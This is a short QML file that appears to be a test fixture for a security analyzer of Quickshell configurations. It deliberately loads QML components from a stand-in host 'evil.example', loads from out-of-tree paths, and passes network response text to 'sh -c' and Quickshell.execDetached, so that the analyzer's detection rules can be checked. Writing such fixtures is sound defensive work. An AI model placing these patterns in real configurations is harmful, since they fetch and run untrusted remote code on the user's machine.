import QtQuick

Item {
    // H4 matrix: H2 reference sinks resolved through earlier local values.
    property string localPanel: "./Panel.qml"
    property string remotePanel: "https://evil.example/Indirect.qml"
    property string outOfTreePanel: "../outside/Indirect.qml"
    property string networkPanel: xhr.responseText
    property string processPayload: xhr.responseText

    Loader { source: localPanel }
    Loader { source: remotePanel }
    Loader { source: outOfTreePanel }
    Loader { source: networkPanel }
    FileView { path: networkPanel }
    Process { command: ["sh", "-c", processPayload] }

    Component.onCompleted: {
        // H4 execution provenance: one-assignment indirection must retain
        // the network response at both execution sinks.
        var detachedPayload = xhr.responseText;
        Quickshell.execDetached(detachedPayload)

        // Static computed createComponent references retain the H2 remote
        // load rule without relying on a URL literal at the call site.
        var componentUrl = "https://evil.example/Created.qml";
        Qt.createComponent(componentUrl)
    }
}
